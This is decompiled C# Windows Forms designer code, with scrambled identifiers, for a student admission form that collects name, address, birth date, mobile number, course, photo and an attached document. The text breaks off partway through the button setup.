using System;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Fc96;
using Gr4;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using i7D;

namespace m3Y2;

[DesignerGenerated]
public class Eb46 : Form
{
	private IContainer components;

	private byte[] Photos1;

	private SqlDataReader dr;

	private string str1;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Go8;
			Label label = _Label1;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label1 = value;
			label = _Label1;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = s1A;
			Label label = _Label2;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label2 = value;
			label = _Label2;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DateTimePicker DateTimePicker1
	{
		[CompilerGenerated]
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Dz6;
			DateTimePicker dateTimePicker = _DateTimePicker1;
			if (dateTimePicker != null)
			{
				dateTimePicker.remove_ValueChanged(eventHandler);
			}
			_DateTimePicker1 = value;
			dateTimePicker = _DateTimePicker1;
			if (dateTimePicker != null)
			{
				dateTimePicker.add_ValueChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label8
	{
		[CompilerGenerated]
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Xg0;
			Label label = _Label8;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label8 = value;
			label = _Label8;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox5
	{
		[CompilerGenerated]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Hz0;
			TextBox textBox = _TextBox5;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox5 = value;
			textBox = _TextBox5;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox6
	{
		[CompilerGenerated]
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = t7H;
			TextBox textBox = _TextBox6;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox6 = value;
			textBox = _TextBox6;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox7")]
	internal virtual TextBox TextBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboBox1")]
	internal virtual ComboBox ComboBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label9
	{
		[CompilerGenerated]
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x8H;
			Label label = _Label9;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label9 = value;
			label = _Label9;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox TextBox8
	{
		[CompilerGenerated]
		get
		{
			return _TextBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = w2Y;
			TextBox textBox = _TextBox8;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox8 = value;
			textBox = _TextBox8;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label10
	{
		[CompilerGenerated]
		get
		{
			return _Label10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g0H;
			Label label = _Label10;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label10 = value;
			label = _Label10;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox9")]
	internal virtual TextBox TextBox9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = k2B;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button5
	{
		[CompilerGenerated]
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = p5N;
			Button button = _Button5;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button5 = value;
			button = _Button5;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = b4E;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label12
	{
		[CompilerGenerated]
		get
		{
			return _Label12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = En5;
			Label label = _Label12;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label12 = value;
			label = _Label12;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox10
	{
		[CompilerGenerated]
		get
		{
			return _TextBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Cz9;
			TextBox textBox = _TextBox10;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox10 = value;
			textBox = _TextBox10;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("OpenFileDialog1")]
	internal virtual OpenFileDialog OpenFileDialog1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button7")]
	internal virtual Button Button7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox ComboBox2
	{
		[CompilerGenerated]
		get
		{
			return _ComboBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = b5W;
			ComboBox comboBox = _ComboBox2;
			if (comboBox != null)
			{
				comboBox.remove_SelectedIndexChanged(eventHandler);
			}
			_ComboBox2 = value;
			comboBox = _ComboBox2;
			if (comboBox != null)
			{
				comboBox.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox11
	{
		[CompilerGenerated]
		get
		{
			return _TextBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = y8D;
			TextBox textBox = _TextBox11;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox11 = value;
			textBox = _TextBox11;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ComboBox3")]
	internal virtual ComboBox ComboBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label14")]
	internal virtual Label Label14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Eb46()
	{
		((Form)this).add_Load((EventHandler)a7Y);
		Sd8z();
	}

	[DebuggerNonUserCode]
	protected override void x1EF(bool Gr2x)
	{
		try
		{
			if (Gr2x && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Gr2x);
		}
	}

	[DebuggerStepThrough]
	private void Sd8z()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0235: Expected O, but got Unknown
		//IL_02aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b4: Expected O, but got Unknown
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0378: Expected O, but got Unknown
		//IL_042f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0439: Expected O, but got Unknown
		//IL_04b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04be: Expected O, but got Unknown
		//IL_0527: Unknown result type (might be due to invalid IL or missing references)
		//IL_0531: Expected O, but got Unknown
		//IL_0635: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Expected O, but got Unknown
		//IL_0702: Unknown result type (might be due to invalid IL or missing references)
		//IL_070c: Expected O, but got Unknown
		//IL_0787: Unknown result type (might be due to invalid IL or missing references)
		//IL_0791: Expected O, but got Unknown
		//IL_0bbc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc6: Expected O, but got Unknown
		//IL_0c8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c94: Expected O, but got Unknown
		//IL_0dc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dce: Expected O, but got Unknown
		//IL_0eb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec3: Expected O, but got Unknown
		//IL_0f84: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f8e: Expected O, but got Unknown
		//IL_1077: Unknown result type (might be due to invalid IL or missing references)
		//IL_1081: Expected O, but got Unknown
		//IL_1204: Unknown result type (might be due to invalid IL or missing references)
		//IL_120e: Expected O, but got Unknown
		//IL_12d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_12da: Expected O, but got Unknown
		//IL_139c: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a6: Expected O, but got Unknown
		//IL_1501: Unknown result type (might be due to invalid IL or missing references)
		//IL_150b: Expected O, but got Unknown
		//IL_15e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_15ed: Expected O, but got Unknown
		//IL_1607: Unknown result type (might be due to invalid IL or missing references)
		//IL_1611: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Eb46));
		Panel1 = new Panel();
		Label1 = new Label();
		Label2 = new Label();
		TextBox1 = new TextBox();
		Label3 = new Label();
		TextBox2 = new TextBox();
		PictureBox1 = new PictureBox();
		Label4 = new Label();
		Label5 = new Label();
		DateTimePicker1 = new DateTimePicker();
		Label6 = new Label();
		TextBox3 = new TextBox();
		Label7 = new Label();
		Label8 = new Label();
		TextBox5 = new TextBox();
		TextBox6 = new TextBox();
		TextBox7 = new TextBox();
		GroupBox1 = new GroupBox();
		TextBox11 = new TextBox();
		Label13 = new Label();
		ComboBox2 = new ComboBox();
		Button7 = new Button();
		Button1 = new Button();
		TextBox10 = new TextBox();
		Label12 = new Label();
		Button3 = new Button();
		Button5 = new Button();
		TextBox9 = new TextBox();
		Label11 = new Label();
		TextBox8 = new TextBox();
		Label10 = new Label();
		TextBox4 = new TextBox();
		Label9 = new Label();
		ComboBox1 = new ComboBox();
		OpenFileDialog1 = new OpenFileDialog();
		ComboBox3 = new ComboBox();
		Label14 = new Label();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Panel1).set_Location(new Point(1, -1));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(727, 48));
		((Control)Panel1).set_TabIndex(0);
		((Control)Label1).set_BackColor(Color.LightSkyBlue);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(1, -1));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(619, 48));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("ADDMISION FORM");
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(2, 27));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(59, 22));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Name ");
		Label2.set_TextAlign((ContentAlignment)16);
		((Control)TextBox1).set_Location(new Point(119, 27));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(221, 22));
		((Control)TextBox1).set_TabIndex(2);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_Location(new Point(2, 62));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(85, 27));
		((Control)Label3).set_TabIndex(3);
		Label3.set_Text("Address ");
		((Control)TextBox2).set_Location(new Point(119, 62));
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(463, 61));
		((Control)TextBox2).set_TabIndex(4);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(449, 203));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(133, 138));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(5);
		PictureBox1.set_TabStop(false);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_Location(new Point(2, 136));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(101, 22));
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("Date Of Birth ");
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_Location(new Point(453, 171));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(101, 28));
		((Control)Label5).set_TabIndex(7);
		Label5.set_Text("Image :-");
		Label5.set_TextAlign((ContentAlignment)32);
		((Control)DateTimePicker1).set_AllowDrop(true);
		DateTimePicker1.set_CustomFormat("");
		DateTimePicker1.set_Format((DateTimePickerFormat)8);
		((Control)DateTimePicker1).set_Location(new Point(119, 136));
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		((Control)DateTimePicker1).set_Size(new Size(121, 22));
		((Control)DateTimePicker1).set_TabIndex(8);
		DateTimePicker1.set_Value(new DateTime(2015, 3, 5, 0, 0, 0, 0));
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_Location(new Point(358, 25));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(52, 22));
		((Control)Label6).set_TabIndex(9);
		Label6.set_Text("PRN ");
		Label6.set_TextAlign((ContentAlignment)16);
		((Control)TextBox3).set_Location(new Point(418, 25));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(164, 22));
		((Control)TextBox3).set_TabIndex(10);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_Location(new Point(253, 133));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(67, 23));
		((Control)Label7).set_TabIndex(11);
		Label7.set_Text("Gender");
		Label7.set_TextAlign((ContentAlignment)16);
		((Control)Label8).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_Location(new Point(2, 176));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(111, 21));
		((Control)Label8).set_TabIndex(13);
		Label8.set_Text("Mobile No. ");
		Label8.set_TextAlign((ContentAlignment)16);
		((Control)TextBox5).set_Location(new Point(119, 175));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(221, 22));
		((Control)TextBox5).set_TabIndex(14);
		((Control)TextBox6).set_Location(new Point(119, 136));
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(121, 22));
		((Control)TextBox6).set_TabIndex(15);
		((Control)TextBox7).set_Location(new Point(335, 136));
		((Control)TextBox7).set_Name("TextBox7");
		((Control)TextBox7).set_Size(new Size(105, 22));
		((Control)TextBox7).set_TabIndex(16);
		((Control)GroupBox1).get_Controls().Add((Control)(object)ComboBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label14);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox11);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label13);
		((Control)GroupBox1).get_Controls().Add((Control)(object)ComboBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button7);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox10);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label12);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox9);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label11);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox8);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label10);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label9);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label8);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label7);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)DateTimePicker1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)ComboBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox7);
		((Control)GroupBox1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox1).set_Location(new Point(0, 56));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(600, 406));
		((Control)GroupBox1).set_TabIndex(17);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Student Information");
		((Control)TextBox11).set_Location(new Point(492, 136));
		((Control)TextBox11).set_Name("TextBox11");
		((Control)TextBox11).set_Size(new Size(90, 22));
		((Control)TextBox11).set_TabIndex(30);
		((Control)Label13).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label13).set_Location(new Point(446, 136));
		((Control)Label13).set_Name("Label13");
		((Control)Label13).set_Size(new Size(49, 22));
		((Control)Label13).set_TabIndex(29);
		Label13.set_Text("Age");
		Label13.set_TextAlign((ContentAlignment)16);
		((ListControl)ComboBox2).set_FormattingEnabled(true);
		ComboBox2.get_Items().AddRange(new object[6] { "B.Sc IT", "BCA", "BSC", "BE", "B.COM", "BA" });
		((Control)ComboBox2).set_Location(new Point(119, 265));
		((Control)ComboBox2).set_Name("ComboBox2");
		((Control)ComboBox2).set_Size(new Size(221, 24));
		((Control)ComboBox2).set_TabIndex(28);
		Button7.set_DialogResult((DialogResult)2);
		((ButtonBase)Button7).set_FlatStyle((FlatStyle)3);
		((Control)Button7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button7).set_Location(new Point(600, 341));
		((Control)Button7).set_Name("Button7");
		((Control)Button7).set_Size(new Size(98, 29));
		((Control)Button7).set_TabIndex(27);
		((ButtonBase)Button7).set_Text("Clear");
		((ButtonBase)Button7).set_UseVisualStyleBackColor(true);
		((ButtonBase)Button1).set_BackColor(Color.White);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button1).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(192, 255, 192));
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_Location(new Point(6, 366));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(98, 29));
		((Control)Button1).set_TabIndex(18);
		((ButtonBase)Button1).set_Text("Save");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)TextBox10).set_Location(new Point(119, 329));
		((Control)TextBox10).set_Name("TextBox10");
		((Control)TextBox10).set_Size(new Size(221, 22));
		((Control)TextBox10).set_TabIndex(25);
		((Control)Label12).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label12).set_Location(new Point(2, 329));
		((Control)Label12).set_Name("Label12");
		((Control)Label12).set_Size(new Size(87, 22));
		((Control)Label12).set_TabIndex(24);
		Label12.set_Text("Doc. Attach");
		Label12.set_TextAlign((ContentAlignment)16);
		((ButtonBase)Button3).set_BackColor(Color.White);
		Button3.set_DialogResult((DialogResult)2);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button3).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(255, 224, 192));
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_Location(new Point(110, 366));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(98, 29));
		((Control)Button3).set_TabIndex(20);
		((ButtonBase)Button3).set_Text("Cancel");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button5).set_BackColor(Color.White);
		((ButtonBase)Button5).get_FlatAppearance().set_BorderColor(Color.PaleTurquoise);
